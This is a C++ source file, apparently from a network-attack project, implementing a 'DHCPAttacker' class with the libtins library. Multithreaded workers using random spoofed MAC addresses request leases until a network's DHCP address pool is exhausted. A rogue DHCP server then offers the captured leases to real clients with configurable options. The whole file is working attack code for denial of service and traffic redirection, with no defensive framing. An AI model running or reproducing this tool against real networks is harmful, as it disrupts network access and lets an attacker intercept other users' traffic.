#include <atomic>
#include <exception>
#include <iostream>
#include <random>
#include <chrono>
#include <iomanip>
#include <optional>
#include <thread>

#include <tins/ethernetII.h>
#include <tins/dhcp.h>
#include <tins/udp.h>
#include <tins/ip.h>
#include <tins/sniffer.h>
#include <tins/packet_sender.h>
#include <tins/utils.h>
#include <tins/rawpdu.h>

#include "dhcp_attacker.hpp"

// ChatGPT Generated
static std::string generate_random_mac(const std::vector<uint8_t> &prefix) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
  
    std::stringstream ss;
    for (size_t i = 0; i < 6; ++i) {
        int value = dis(gen);
        // for the first byte, we make sure it is a unicast and globally unique address
        if (i == 0) {
            value = (value & 0xFC) | 0x02; 
        }

        if (i < prefix.size())
            value = prefix[i];
        
        ss << std::hex << std::setw(2) << std::setfill('0') << value;
        if (i != 5) {
            ss << ":";
        }
    }
    return ss.str();
}

// Extracts a DHCP packet from a Tins PDU
static Tins::DHCP extract_dhcp(const Tins::PDU &pdu){
    // Gets UDP
    Tins::UDP udp = pdu.rfind_pdu<Tins::UDP>();

    // Gets UDP data
    auto raw_data = udp.rfind_pdu<Tins::RawPDU>().payload();

    // Gets DHCP packet
    return Tins::DHCP(&raw_data[0], raw_data.size());
}


DHCPAttacker::DHCPAttacker(std::string iface_name)
    : iface_name_(iface_name) {}


DHCPAttacker::~DHCPAttacker() {
    for (auto &thread : starvation_workers_)
        thread.join();
    
    server_worker_.join();
}

void DHCPAttacker::initiate_starvation(size_t num_threads) {
    for (size_t i = 0; i < num_threads; i++)
        starvation_workers_.emplace_back([&](){
            for (;;) starvation_worker();
        }); 
}

void DHCPAttacker::initiate_server() {
    // Sets HW address of server
    server_hw_address_ = Tins::EthernetII::address_type(generate_random_mac(mac_prefix_));

    // Starts worker
    server_worker_ = std::thread([&]() { server_worker(); });
}

void DHCPAttacker::push_server_option(std::function<void(Tins::DHCP&)> op) {
    std::lock_guard<std::mutex> lock(server_options_mutex_);
    server_options_.push_back(op);
}

void DHCPAttacker::push_lease(DHCPLease &lease) {
    std::lock_guard<std::mutex> lock(leases_acquired_mutex_);
    leases_acquired_.insert(lease);
}

void DHCPAttacker::server_worker() {
    // Device to communicate on
    Tins::NetworkInterface iface(iface_name_);

    // Opens up sniffer to listen for answers
    Tins::SnifferConfiguration config;
    config.set_filter("udp src port 68 and udp dst port 67");
    config.set_promisc_mode(true);
    config.set_snap_len(2000);
    config.set_immediate_mode(true);

    Tins::Sniffer sniffer(iface_name_, config);
    
    // Opens up sender
    Tins::PacketSender sender(iface);

    // Listens for incoming requests
    Tins::DHCP discover;
    sniffer.sniff_loop([&](Tins::PDU &pdu) {
        // Filters out packets coming from this machine
        // if (pdu.)

        // Gets DHCP PDU
        discover = extract_dhcp(pdu);

        // Verifies if transaction ID is used by starver
        {
            std::lock_guard<std::mutex> lock(starvation_ids_mutex_);
            if (starvation_ids_.contains(discover.xid()))
                return true;
        }


        // Verifies that we have an offer packet
        if (discover.type() != Tins::DHCP::DISCOVER)
            return true;

        // Treats request
        std::lock_guard<std::mutex> lock(treating_ids_mutex_);
        if (treating_ids_.contains(discover.xid()))
            return true; // Does not treat duplicate request

        treating_ids_.insert(discover.xid());

        std::thread([&](auto d) { treat_discovery(d); }, discover).detach();
        return true;
    });
}

void DHCPAttacker::treat_discovery(Tins::DHCP discover) {
    // Device to communicate on
    Tins::NetworkInterface iface(iface_name_);

    // Opens up sniffer to listen for answers
    Tins::SnifferConfiguration config;
    config.set_filter("udp src port 68 and udp dst port 67");
    config.set_promisc_mode(true);
    config.set_snap_len(2000);
    config.set_immediate_mode(true);

    Tins::Sniffer sniffer(iface_name_, config);
    
    // Opens up sender
    Tins::PacketSender sender(iface);

    // Transaction ID
    auto transaction_id = discover.xid();

    // Server IP address
    auto server_ip = iface.ipv4_address();

    // Constructs constant headers
    Tins::EthernetII eth = 
            Tins::EthernetII(Tins::EthernetII::BROADCAST, server_hw_address_) /
            Tins::IP(Tins::IPv4Address::broadcast, server_ip) /
            Tins::UDP(sport, dport);

    // Chooses a lease for client
    DHCPLease lease;
    
    // Tries to provide requested lease
    // try {
    //     // Gets requested IP
    //     auto requested_ip = discover.requested_ip();

    //     // Searches for requested IP
    //     bool success = false;
    //     {
    //         std::lock_guard<std::mutex> lock(leases_acquired_mutex_);
    //         for (const auto &l : leases_acquired_) {
    //             if (l.addr == requested_ip) {
    //                 success = true;
    //                 lease = l;
    //                 break;
    //             }
    //         }
    //     }
    // } catch (const Tins::option_not_found &) { }

    // No requested IP => chooses one
    do {
        // No leases => no answer
        if (leases_acquired_.empty()) {
            std::cerr << "No leases available!" << std::endl;
            return;
        }

        // Gets lease
        lease = *leases_acquired_.begin();
        leases_acquired_.erase(lease);
    } while (!lease.is_valid());

    // Contructs offer
    Tins::DHCP offer; 
    offer.type(Tins::DHCP::OFFER);
    offer.xid(transaction_id);
    offer.yiaddr(lease.addr);
    offer.chaddr(discover.chaddr());
    offer.lease_time(lease.remaining_lease());
    offer.server_identifier(server_ip);
    
    // Adds user supplied options
    {
        std::lock_guard<std::mutex> lock(server_options_mutex_);
        for (auto &opt : server_options_)
            opt(offer);
    }

    offer.end();

    // Sends offer
    Tins::EthernetII offer_pkt = eth / offer;
    sender.send(offer_pkt);

    // Initiates timeout on transaction
    std::atomic_bool timeout_flag = false;
    std::thread([&timeout_flag](auto time) {
        std::this_thread::sleep_for(time);
        timeout_flag = true;
    }, std::chrono::seconds(transaction_timeout_)).detach();

    // Waits for request
    Tins::DHCP request;
    sniffer.sniff_loop([&](Tins::PDU &pdu) {
        if (timeout_flag)
            return false;

        // Gets DHCP PDU
        request = extract_dhcp(pdu);

        // Verifies if transaction id matches
        if (request.xid() != transaction_id)
            return true;

        // Verifies that we have an offer packet
        if (request.type() != Tins::DHCP::REQUEST)
            return true;

        return false;
    });

    // Verifies timeout
    if (timeout_flag) {
        // Reinserts lease
        std::lock_guard<std::mutex> lock(leases_acquired_mutex_);
        leases_acquired_.insert(lease);
        return;
    }

    // Verifies if request matches expected IP
    if (request.requested_ip() != lease.addr) {
        // Sends NAK and terminates
        Tins::DHCP nak;
        nak.type(Tins::DHCP::NAK);
        nak.xid(transaction_id);
        nak.chaddr(discover.chaddr());
        nak.server_identifier(server_ip);
        nak.end();

        // Sends NAK
        Tins::EthernetII nak_pkt = eth / nak;
        sender.send(nak_pkt);
        
        // Reinserts lease
        std::lock_guard<std::mutex> lock(leases_acquired_mutex_);
        leases_acquired_.insert(lease);
        return;
    }


    // Sends ACK
    Tins::DHCP ack;
    ack.type(Tins::DHCP::ACK);
    ack.xid(transaction_id);
    ack.yiaddr(lease.addr);
    ack.chaddr(discover.chaddr());
    ack.lease_time(lease.remaining_lease());
    ack.server_identifier(server_ip);

    // Adds user supplied options
    {
        std::lock_guard<std::mutex> lock(server_options_mutex_);
        for (auto &opt : server_options_)
            opt(ack);
    }

    ack.end();

    // Sends
    Tins::EthernetII ack_pkt = eth / ack;
    sender.send(ack_pkt);

    // Removes transcation ID from store
    {
        std::lock_guard<std::mutex> lock(treating_ids_mutex_);
        treating_ids_.erase(discover.xid());
    }

    // Debug info
    std::cout << "Lease attributed." << std::endl;
    std::cout << "IP: " << lease.addr.to_string() << std::endl;
    std::cout << "Lease Time: " << ack.lease_time() << " s" << std::endl;
    std::cout << "Leases left on pool: " << leases_acquired_.size() << std::endl;
}

void DHCPAttacker::starvation_worker() {
    // Sets transaction ID for the rest of the transaction
    uint32_t transaction_id;
    {
        std::lock_guard<std::mutex> lock(starvation_ids_mutex_);

        // Randomizes until new ID found
        do {
            transaction_id = std::rand();
        } while (starvation_ids_.contains(transaction_id));
        
        starvation_ids_.insert(transaction_id);
    }

    // Will store lease if acquired
    std::optional<DHCPLease> lease = {};

    // Initiates timeout on transaction
    std::atomic_bool timeout_flag = false;
    std::thread([&timeout_flag](auto time) {
        std::this_thread::sleep_for(time);
        timeout_flag = true;
    }, std::chrono::seconds(transaction_timeout_)).detach();

    // Tries transaction
    try {
        // Sets HW address
        const auto src_hw_address = Tins::EthernetII::address_type(generate_random_mac(mac_prefix_));

        // Device to communicate on
        Tins::NetworkInterface iface(iface_name_);

        // Opens up sniffer to listen for answers
        Tins::SnifferConfiguration config;
        config.set_filter("udp src port 67 and udp dst port 68");
        config.set_promisc_mode(true);
        config.set_snap_len(2000);
        config.set_immediate_mode(true);

        Tins::Sniffer sniffer(iface_name_, config);
        
        // Opens up sender
        Tins::PacketSender sender(iface);

        // Creates ethernet frame
        Tins::EthernetII eth = 
            Tins::EthernetII(Tins::EthernetII::BROADCAST, src_hw_address) /
            Tins::IP(Tins::IPv4Address::broadcast, "0.0.0.0") /
            Tins::UDP(dport, sport);


        // Creates DHCP discovery
        Tins::DHCP discover_dhcp;
        discover_dhcp.chaddr(src_hw_address);
        discover_dhcp.type(Tins::DHCP::DISCOVER);
        discover_dhcp.xid(transaction_id);
        discover_dhcp.lease_time(requested_lease_time);
        discover_dhcp.end();


        // Prepares frame with payload and sends
        Tins::EthernetII discover = eth / discover_dhcp;
        sender.send(discover);

        // Reads offer
        Tins::DHCP offer;
        sniffer.sniff_loop([&](Tins::PDU &pdu) {
            // Verifies timeout
            if (timeout_flag)
                return false;

            // Gets DHCP PDU
            offer = extract_dhcp(pdu);

            // Verifies if transaction id matches
            if (offer.xid() != transaction_id)
                return true;

            // Verifies that we have an offer packet
            if (offer.type() != Tins::DHCP::OFFER)
                return true;

            return false;
        });
        
        if (timeout_flag) {
            throw std::runtime_error("Timeout");
        }

        // Gets assigned IP
        auto assigned_ip = offer.yiaddr();

        // Creates DHCP request
        Tins::DHCP request_dhcp;
        request_dhcp.chaddr(src_hw_address);
        request_dhcp.type(Tins::DHCP::REQUEST);
        request_dhcp.xid(transaction_id);
        request_dhcp.requested_ip(assigned_ip);
        request_dhcp.lease_time(offer.lease_time());
        request_dhcp.server_identifier(offer.server_identifier());

        std::vector<uint8_t> identifier;
        identifier.push_back(Tins::DHCP::ETHERNET_II);
        for (const auto &octet : src_hw_address)
            identifier.push_back(octet);

        request_dhcp.add_option(
            {Tins::DHCP::DHCP_CLIENT_IDENTIFIER, identifier.begin(), identifier.end()}
        );

        request_dhcp.end();

        // Prepares frame with payload and sends
        Tins::EthernetII request = eth / request_dhcp;
        sender.send(request);

        // Reads ACK/NACK
        Tins::DHCP ack_nack;
        sniffer.sniff_loop([&](Tins::PDU &pdu) {
            // Verifies timeout
            if (timeout_flag)
                return false;
            
            // Gets DHCP PDU
            ack_nack = extract_dhcp(pdu);

            // Verifies if transaction id matches
            if (ack_nack.xid() != transaction_id)
                return true;

            // Verifies if packet is ACK/NACK
            if (ack_nack.type() == Tins::DHCP::ACK ||
                ack_nack.type() == Tins::DHCP::NAK)
                return false;
            
            return true;
        });

        if (timeout_flag)
            throw std::runtime_error("Timeout");
        
        // Sets lease if acquired
        if (ack_nack.type() == Tins::DHCP::NAK)
            throw std::runtime_error("NAK");
        
        lease = DHCPLease();
        lease.value().acquisition_time = 
            std::chrono::steady_clock::now();
        lease.value().addr = offer.yiaddr();
        lease.value().lease_time = ack_nack.lease_time();
    } catch (std::runtime_error &e) {}

    // Removes transaction ID from set
    {
        std::lock_guard<std::mutex> lock(starvation_ids_mutex_);
        starvation_ids_.erase(transaction_id);
    }

    // Verifies if lease was acquired, if so adds it to list
    if (lease.has_value()) {
        std::lock_guard<std::mutex> mutex(leases_acquired_mutex_);
        leases_acquired_.insert(lease.value());
    }
}

bool DHCPAttacker::DHCPLease::operator<(const DHCPAttacker::DHCPLease &l) const {
    return addr < l.addr;
}

bool DHCPAttacker::DHCPLease::is_valid() const {
    return (std::chrono::steady_clock::now() - acquisition_time) < std::chrono::seconds(lease_time);
}

uint32_t DHCPAttacker::DHCPLease::remaining_lease() const {
    std::chrono::duration<double, std::nano> time_since = 
        std::chrono::steady_clock::now() - acquisition_time;
    
    return lease_time - std::chrono::duration<double, std::ratio<1>>(time_since).count();
}